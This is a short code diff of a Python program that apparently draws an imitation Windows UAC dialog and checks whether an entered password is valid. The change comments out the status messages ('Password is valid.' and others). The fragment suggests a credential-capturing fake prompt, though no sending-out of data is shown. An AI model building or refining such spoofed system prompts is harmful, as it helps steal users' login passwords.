@@ -124,11 +124,11 @@ def on_button1_click(button_text):
 
         # Check the result
         if result:
-            print ("Password is valid.")
+            #print ("Password is valid.")
             CloseHandle(token)
             return True
         else:
-            print("Password is invalid.")
+            #print("Password is invalid.")
             return False
 
     global valid
@@ -146,7 +146,8 @@ def on_button1_click(button_text):
 
 
 def on_button2_click(button_text):
-    print(f"Button 2 clicked! Text: {button_text}")
+    #print(f"Button 2 clicked! Text: {button_text}")
+    pass
 
 def create_uac_box(width_percent, height_percent1, height_percent2):
     def make_label(parent, path, x, y, relx, rely):
